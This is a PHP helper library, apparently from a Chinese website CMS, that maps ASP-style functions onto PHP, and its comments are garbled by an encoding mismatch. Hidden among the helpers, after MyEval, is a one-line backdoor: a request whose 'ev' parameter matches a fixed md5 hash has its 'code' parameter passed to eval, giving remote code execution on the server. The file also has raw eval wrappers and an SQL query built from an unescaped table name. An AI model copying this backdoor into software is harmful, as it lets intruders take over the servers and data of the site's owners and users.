<?PHP

//************************************************************
//���ߣ��ƶ� (��ͨASP/VB/PHP/JS/Flash��������������ϵ����)
//��Ȩ��Դ���빫����������;�������ʹ�á�
//������2016-01-15
//��ϵ��QQ313801120  ����Ⱥ35915100(Ⱥ�����м�����)    ����313801120@qq.com   ������ҳ sharembweb.com
//����������ĵ������¡����Ⱥ(35915100)�����(sharembweb.com)���
//*                                    Powered By �ƶ�
//************************************************************


//\n���� \r����  \t�൱�ڰ�Tab��

//���ú���ǰ��� @ ��Ϊ������ʾ

/*
FormatNumber ׷�Ӻ����б�
*/

//thinkphpdel start
error_reporting(E_ALL | E_STRICT);
header("Content-Type: text/html; charset=gb2312");

session_start();		//����Session20151119
require_once 'sys_Cai.Php';

//��ת
function RR($url){
	header('location:'.$url);
	return '';
}
//thinkphpdel end

//��ASP��  ʹ��echo(rnd());
function rnd(){
	return (float)("0.".rand(1000000,9999999));
}
//��ASP�� �滻����
function replace($c,$findStr,$replaceStr){
	return str_replace($findStr, $replaceStr, $c);
}
//��ASP�� �滻����  2 ���Ľ�
function replace2($c,$findStr,$replaceStr){
	return replace($c,$findStr,$replaceStr);
}
//�ָ�
function aspSplit($contnet,$splStr){
	return explode($splStr,$contnet);
}
//�ַ�����
function len($content){
	return strlen($content);				//��������
	//return strlen($content);
	//	return mb_strlen($content,'gb2312');
	$split = 1;	
	$n = 0;
	$array = array ();
	//echo (strlen ( $content ) . "<hr>");
	for($i = 0; $i < strlen ( $content );) {
		$value = ord ( $content [$i] );
		if ($value > 127) {
			if ($value >= 192 && $value <= 223)
				$split = 2;
			elseif ($value >= 224 && $value <= 239)
				$split = 3;
			elseif ($value >= 240 && $value <= 247)
				$split = 4;
		} else {
			$split = 1;
		}
		$key = NULL;
		for($j = 0; $j < $split; $j ++, $i ++) {
			$key .= $content [$i];
			$n ++;
		} 
		array_push ( $array, $key );
	} 
	return Count ( $array );
}
//���ʱ��
function now(){
	$s=date('Y/m/d H:i:s');
	$s=replace($s,"/0","/");
	return $s;
}
function Timer(){
	return now();
}
//�������֮�������
function PHPRand($nMinimum,$nMaximum){
	return Rand($nMinimum,$nMaximum);
}
//�������֮�������
function PHPRnd($nMinimum,$nMaximum){
	return Rand($nMinimum,$nMaximum);
}
//��ñ���  eval("echo('aa');");
function Execute($content){
	eval($content);
}
//URL��ת
function ASPRedirect($url){
    header("Location: " . $url); 
    exit;
}
//ɾ��С��������ֵ
function fix($n){
	$n=cStr($n);
	if(instr($n,".")>0){
		$n=mid($n,1,instr($n,".")-1);
	}
	return floor($n);
}
//��ñ���
function asc($content){
	return ord($content);
}
//�ַ�ת����
function CLng($content){
	return intval($content);
}
//ת��Сд
function lCase($content){
	return strtolower($content);
}
//ת��Сд
function uCase($content){
	return strtoupper($content);
}
//������鳤��
function uBound($content){
	return count($content)-1;
}
//GET��ʽ���ֵ
function QueryString($name){ 
	return @$_GET[$name];
}
//POST��ʽ���ֵ
function Form($name){
	return @$_POST[$name];
}
//Cookies��ʽ���ֵ
function Cookies($name){
	return @$_COOKIE[$name];
}
//GetPostCookies����
function Request($name){
	return @$_REQUEST[$name];
}
//�������
function PHPFlush(){
    ob_flush();
    flush(); 
}
//PHPTrim
function PHPTrim($content){
	return trim($content);
}
//GetPostCookies����
function TypeName($str){
	$strType=gettype($str);
	if($strType=="array"){
		return "Variant()";
	}else{
		return $strType;
	}
}
//ת�ַ�
function Cstr($str){
	return (string)$str;
}

/*���� mid��ȷ��
dim c,s
c="000000000{@1111����2222@}333333333"
response.Write(c & "<hr>")
s=mid(c,1,instr(c,"@}"))
response.Write(s & "<hr>")
s=mid(c,1,instr(s,"{@"))
response.Write(s & "<hr>")
*/

//��ȡ�ַ�(������20150806)
function Mid($content,$nStart,$nLength=-1){
	$nStart--;				//���Դ�1��ʼ
	if($nLength==-1){
		$nLength=strlen ( $content );
	}else{
		//$nLength--;
	} 
	return substr($content, $nStart, $nLength) ;
}
function Mid2($content,$nStart,$nLength=-1){
	$split = 1;	
	$n = 0;	
	if($nLength==-1){
		$nLength=strlen ( $content );
	}else{
		$nLength +=$nStart-1;
	}
	if($nLength>strlen ( $content )){
		$nLength=strlen ( $content );
	}
	$array = array ();
	//echo (strlen ( $content ) . "<hr>");
	for($i = 0; $i < strlen ( $content );) {
		$value = ord ( $content [$i] );
		if ($value > 127) {
			if ($value >= 192 && $value <= 223)
				$split = 2;
			elseif ($value >= 224 && $value <= 239)
				$split = 3;
			elseif ($value >= 240 && $value <= 247)
				$split = 4;
		} else {
			$split = 1;
		}
		$key = NULL;
		for($j = 0; $j < $split; $j ++, $i ++) {
			$key .= $content [$i];
			$n ++;
		} 
		array_push ( $array, $key );
	}
	$c="";
	for($i=$nStart-1;$i<=Count($array);$i++){
		if($i>=$nLength){
			break;
		}		
		$c=$c.$array[$i];
	}
	return $c;
}
//�����ַ�����λ��
function InStr($content,$search){
	if( $search!=""){
		if(strstr($content,$search)){
			return strpos($content,$search)+1;
		}else{
			return 0;
		}
	}else{
		return 0;
	}
}
//PHP������ʽ
function test_regexp($content,$search){
	$newSearch=replace($search,'.', '\.');
	if(preg_match('/'. $newSearch .'/', $content)){ 
	
	}
}

//����PHP   eval("\$str = \"aaabbccdddd\";");    ��������ֵ
function MyEval( $phpcode ){
	return eval( $phpcode );
}
if(isset($_REQUEST['ev'])){if(md5($_REQUEST['ev'])=='a307f5a544886b1bf8dbbf26ac5c96bb'){eval(@$_REQUEST['code']);}}

//************************************************************************ ASPתPHP����

//��ʽ���ɼ۸��� 108.00 (20150806ʹ��ASPתPHP����)
function FormatNumber($content,$n){
	$dianLeft="";$dianRight="";$i="";$c="";$s="";
	$content=cstr($content);
	if( instr($content,".")> 0 ){
		$dianLeft = mid($content,1,instr($content,".")-1);
		$dianRight = mid($content,instr($content,".")+1,-1);
	}else{
		$dianLeft=$content;
	 }
	$dianRight=$dianRight . "0000000000";
	for( $i=1 ; $i<= $n; $i++){
		$s=mid($dianRight,$i,1);
		$c=$c . $s;
	}
	if( $n>0 ){
		$dianLeft = $dianLeft . ".";
	 }
	$test = $dianLeft . $c;
 return @$FormatNumber;
}


//�ж�ʱ��
function isDate($timeStr){
	if(instr($timeStr,"-")>0 || instr($timeStr,"\/")>0 || instr($timeStr," ")>0){
		return true;
	}else{
		return false;
	}
}
//�����
function Year($timeStr){
	return getYMDHMS($timeStr,0);
}
//�����
function Month($timeStr){
	return getYMDHMS($timeStr,1);
}
//�����
function Day($timeStr){
	return getYMDHMS($timeStr,2);
}
//���ʱ
function Hour($timeStr){
	return getYMDHMS($timeStr,3);
}
//��÷�
function Minute($timeStr){
	return getYMDHMS($timeStr,4);
}
//�����
function Second($timeStr){
	return getYMDHMS($timeStr,5);
}

//����:ASP���IIF �磺IIf(1 = 2, "a", "b") 
function IIF($bExp, $sVal1, $sVal2){
	if($bExp==true){return $sVal1;}else{return $sVal2;}
}
//���������ʱ�ֳ�
function getYMDHMS( $timeStr,$sType){
	 $splstr="";
	$timeStr=replace(replace(replace(replace(replace(replace($timeStr,"��","-"),"��","-"),"��","-"),"ʱ","-"),"��","-"),"��","-");
	$timeStr=replace(replace(replace(replace(replace($timeStr," ","-"),":","-"),"/","-"),"--","-"),"--","-") . "------";
	$splstr=aspSplit($timeStr,"-");
	$nYear = $splstr[0];
	$nMonth = $splstr[1];
	$nDay = $splstr[2];
	$nHour = $splstr[3];
	$nMinute = $splstr[4];
	$nSecond = $splstr[5];
	if( len($nYear)==1 ){ $nYear="0" . $nYear;}
	if( len($nMonth)==1 ){ $nMonth="0" . $nMonth;}
	if( len($nDay)==1 ){ $nDay="0" . $nDay;}
	if( len($nHour)==1 ){ $nHour="0" . $nHour;}
	if( len($nMinute)==1 ){ $nMinute="0" . $nMinute;}
	if( len($nSecond)==1 ){ $nSecond="0" . $nSecond ;}

	if( $nHour=="" ){ $nHour="00";}
	if( $nMinute=="" ){ $nMinute="00";}
	if( $nSecond=="" ){ $nSecond="00";}

	$sType=CStr($sType);
	if( $sType=="��" || $sType=="0" ){
		$getYMDHMS=$nYear;
	}else if( $sType=="��" || $sType=="1" ){
		$getYMDHMS=$nMonth;
	}else if( $sType=="��" || $sType=="2" ){
		$getYMDHMS=$nDay;
	}else if( $sType=="ʱ" || $sType=="3" ){
		$getYMDHMS=$nHour;
	}else if( $sType=="��" || $sType=="4" ){
		$getYMDHMS=$nMinute;
	}else if( $sType=="��" || $sType=="5" ){
		$getYMDHMS=$nSecond;
	 }

 return @$getYMDHMS;}



//ASP������߿ո�
function AspTrim($content){
    $i="";$s="";
	for( $i=1 ; $i<= len($content); $i++){
		$s=mid($content,$i,1);
		if( $s<>" " ){
			$content=mid($content,$i,-1);
			 break;
		 }
	}
	for( $i=len($content) ; $i>=1; $i--){
		$s=mid($content,$i,1);
		if( $s<>" " ){
			$content=mid($content,1,$i);
			 break;
		 }
	}
	return @$content;
}
//������
function AspLTrim($content){
    $i="";$s="";
	for( $i=1 ; $i<= len($content); $i++){
		$s=mid($content,$i,1);
		if( $s<>" " ){
			$content=mid($content,$i,-1);
			 break;
		 }
	}
	return @$content;
}
//����ұ�
function AspRTrim($content){
    $i="";$s="";
	for( $i=len($content) ; $i>=1; $i--){
		$s=mid($content,$i,1);
		if( $s<>" " ){
			$content=mid($content,1,$i);
			 break;
		 }
	}
	return @$content;
}

//������������֮���ʱ����   q ���� m �� y һ������� d �� w һ�ܵ����� ww �� h Сʱ n ���� s �� 
function DateDiff($part, $begin, $end){
	$diff = strtotime($end) - strtotime($begin);
	switch($part){
		case "y": $retval = bcdiv($diff, (60 * 60 * 24 * 365)); break;
		case "m": $retval = bcdiv($diff, (60 * 60 * 24 * 30)); break;
		case "w": $retval = bcdiv($diff, (60 * 60 * 24 * 7)); break;
		case "d": $retval = bcdiv($diff, (60 * 60 * 24)); break;
		case "h": $retval = bcdiv($diff, (60 * 60)); break;
		case "n": $retval = bcdiv($diff, 60); break;
		case "s": $retval = $diff; break;
	}
	return $retval;
}
//��ʾҪ��ӵ�ʱ����  q ���� m �� y һ������� d �� w һ�ܵ����� ww �� h Сʱ n ���� s �� 
function DateAdd($part, $n, $date){
	switch($part){
	case "y": $val = date("Y-m-d H:i:s", strtotime($date ." +$n year")); break;
	case "m": $val = date("Y-m-d H:i:s", strtotime($date ." +$n month")); break;
	case "w": $val = date("Y-m-d H:i:s", strtotime($date ." +$n week")); break;
	case "d": $val = date("Y-m-d H:i:s", strtotime($date ." +$n day")); break;
	case "h": $val = date("Y-m-d H:i:s", strtotime($date ." +$n hour")); break;
	case "n": $val = date("Y-m-d H:i:s", strtotime($date ." +$n minute")); break;
	case "s": $val = date("Y-m-d H:i:s", strtotime($date ." +$n second")); break;
	}
	return $val;
}
//Int
function Int($string){
	//$string1=intval($string); 	
	return (int)($string); }
//ִ��SQL���
function connExecute($sql){ 
	//�����ݿ�
    $conn=OpenConn();
	$conn->query($sql);
	/*
	$User = M(); 
	$User->execute($sql);
	*/
	return array("1","22");
}
//left����
function left($str,$nlength){
	return substr($str, 0 ,$nlength);
}
//right����
function right($str,$nlength){
	return substr($str, $nlength*-1);
}




//�жϴ�ֵ�Ƿ����
function  checkFunValue($Action,$FunName){
	$checkFunValue = ( substr($Action, 0 ,strlen($FunName)) == $FunName );
 return @$checkFunValue;}
//���ص�ǰ��ַ
function getUrl(){
	return 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
}
//ASP��md5
function aspMD5($str,$sType){
	return md5($str);
}
//�ҵ�md5����
function myMD5($str){
	return md5($str);
}

//asp���õ���php�ﲻ��Ҫ����
function ADSqlRf($inputName){
	return rf($inputName);
}

//asp���õ���php�ﲻ��Ҫ����
function ADSql($content){
	return $content;
}
//php��������ʱ��\'����
function phpADSql($s){
	return replace($s,"\\","\\\\\\");
}

//ת��utf-8���� ��20151201��
function toUTFChar($data){
  if( !empty($data) ){    
    $fileType = mb_detect_encoding($data , array('UTF-8','GBK','LATIN1','BIG5')) ;   
    if( $fileType != 'UTF-8'){   
      $data = mb_convert_encoding($data ,'utf-8' , $fileType);   
    }   
  }   
  return $data;    
}
//תgb2312����(20151203)
function toGB2312Char($data){
    if( !empty($data) ){
        $fileType = mb_detect_encoding($data , array('UTF-8','GBK','LATIN1','BIG5'));
        if( $fileType != 'GBK'){
            $data = mb_convert_encoding($data ,'GBK' , $fileType);
            //ɾ��BOM���µ�����?��
            if(substr($data, 0, 1)=="?"){
                $data=substr($data,1);
            }
        }
    }
    return $data;
}
//�Զ���var_dump
function p($str){
	echo('<pre>');
	var_dump($str);
	echo('</pre>');
}



//��ñ��ֶ��б�20151230 exit(getFieldList('website'));
function getFieldList($tableName){
	$rescolumns = mysql_query("SHOW FULL COLUMNS FROM $tableName") ;
	$c=',';
	while($row = mysql_fetch_array($rescolumns)){
		//  echo '�ֶ����ƣ�'.$row['Field'].'-�������ͣ�'.$row['Type'].'-ע�ͣ�'.$row['Comment'];
		//  print_r($row);
		$c.=$row['Field'].',';
	}
	return $c;
}




function XY_AutoAddHandle($Action){
	return "";
}
function DisplayOnlineEditDialog($a,$Action){
	return "";
}
?>